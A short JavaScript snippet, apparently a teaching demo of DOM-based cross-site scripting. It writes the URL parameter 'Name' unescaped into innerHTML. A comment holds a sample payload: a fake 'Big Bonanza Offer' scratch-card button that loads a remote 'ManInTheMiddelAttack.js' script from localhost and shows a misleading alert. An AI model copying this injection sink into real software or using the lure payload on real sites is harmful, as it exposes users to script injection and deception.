
function onloadEvent() {
  var url = new URL(window.location.href);
  var c = url.searchParams.get("Name");
  console.log(c);
  var text = c; // "Big Bonanza Offer: <input type='button' title='Big Bonanza Offer' value='Scratch Card' onclick="if(document.getElementById('SomeFlag')==undefined) { maliciousScript = document.createElement('script'); maliciousScript.src = 'http://localhost:3000/ManInTheMiddelAttack.js'; document.body.appendChild(maliciousScript); someFlag = document.createElement('SomeFlag'); someFlag.id = 'SomeFlag'; document.body.appendChild(someFlag); alert('You will get an email notification for the offer'); setTimeout( function() { injectManInTheMiddleScript(); } , 2000); } " /> "
  document.getElementById("demo").innerHTML = text;
}

function myFunction() {
  console.log("Sending Confidential Detail");
}
